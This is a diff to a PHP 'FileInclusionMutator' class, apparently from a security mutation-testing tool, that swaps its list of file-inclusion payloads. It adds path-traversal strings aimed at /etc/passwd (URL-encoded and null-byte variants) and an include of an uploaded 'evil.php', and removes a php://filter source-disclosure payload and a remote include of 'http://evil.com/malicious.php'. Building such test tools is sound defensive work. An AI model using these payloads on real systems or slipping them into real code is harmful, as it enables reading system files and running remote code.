@@ -23,6 +23,12 @@ final class FileInclusionMutator implements Mutator
     {
         $payloads = [
             './test.txt',
+            '../../etc/passwd',
+            '../../.../etc/passwd',
+            'index.php',
+            '../../uploads/evil.php',
+            'vulnerable.com/download?name=..%2f..%2f..%2f..%2fetc%2fpasswd',
+            '../../../../etc/passwd%00',
         ];
 
         foreach ($payloads as $payload) {
@@ -44,8 +50,11 @@ final class FileInclusionMutator implements Mutator
             <<<'DIFF'
                 - include($file);
                 + include("../../etc/passwd");
-                + include("php://filter/convert.base64-encode/resource=config.php");
-                + include("http://evil.com/malicious.php");
+                + include("../../.../etc/passwd");
+                + include("index.php");
+                + include("../../uploads/evil.php");
+                + include("vulnerable.com/download?name=..%2f..%2f..%2f..%2fetc%2fpasswd");
+                + include("../../../../etc/passwd%00");
                 DIFF
         );
     }
